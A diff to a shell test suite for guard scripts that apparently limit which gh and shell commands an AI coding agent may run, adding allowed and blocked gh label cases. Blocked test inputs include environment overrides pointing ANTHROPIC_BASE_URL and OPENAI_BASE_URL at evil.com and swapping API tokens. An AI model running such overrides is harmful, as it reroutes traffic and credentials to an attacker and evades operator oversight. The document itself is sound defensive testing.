@@ -132,6 +132,12 @@ assert_allowed check-gh.sh "gh api repos/foo/bar/pulls/1/comments" "api GET (def
 assert_allowed check-gh.sh "git log --oneline" "non-gh command"
 assert_allowed check-gh.sh "ls -la" "unrelated command"
 
+# Label operations — allowed
+assert_allowed check-gh.sh "gh label create bug --color red" "label create"
+assert_allowed check-gh.sh "gh label edit bug --name bug-fix" "label edit"
+assert_allowed check-gh.sh "gh label view bug" "label view"
+assert_allowed check-gh.sh "gh label list" "label list"
+
 # --- check-gh.sh (blocked commands) ---
 
 assert_blocked check-gh.sh "gh pr merge 123" "pr merge"
@@ -147,6 +153,8 @@ assert_blocked check-gh.sh "gh api -X DELETE repos/foo/bar/issues/1" "api DELETE
 assert_blocked check-gh.sh "gh api -X POST repos/foo/bar/merges" "api POST"
 assert_blocked check-gh.sh "gh api --method PUT repos/foo/bar" "api PUT"
 assert_blocked check-gh.sh "gh api --method PATCH repos/foo/bar" "api PATCH"
+assert_blocked check-gh.sh "gh label delete bug" "label delete"
+assert_blocked check-gh.sh "gh label clone owner/repo" "label clone"
 
 # =============================================================================
 # check-publish.sh
@@ -316,6 +324,7 @@ assert_blocked check-shell-bypass.sh "ANTHROPIC_BASE_URL=https://evil.com claude
 assert_blocked check-shell-bypass.sh "OPENAI_BASE_URL=https://evil.com python app.py" "OPENAI_BASE_URL"
 assert_blocked check-shell-bypass.sh "GH_TOKEN=evil gh pr list" "GH_TOKEN"
 assert_blocked check-shell-bypass.sh "GITHUB_TOKEN=evil gh pr list" "GITHUB_TOKEN"
+assert_blocked check-shell-bypass.sh "GEMINI_API_KEY=evil gemini" "GEMINI_API_KEY"
 
 # Normal env vars — allowed
 assert_allowed check-shell-bypass.sh "NODE_ENV=production npm start" "NODE_ENV"
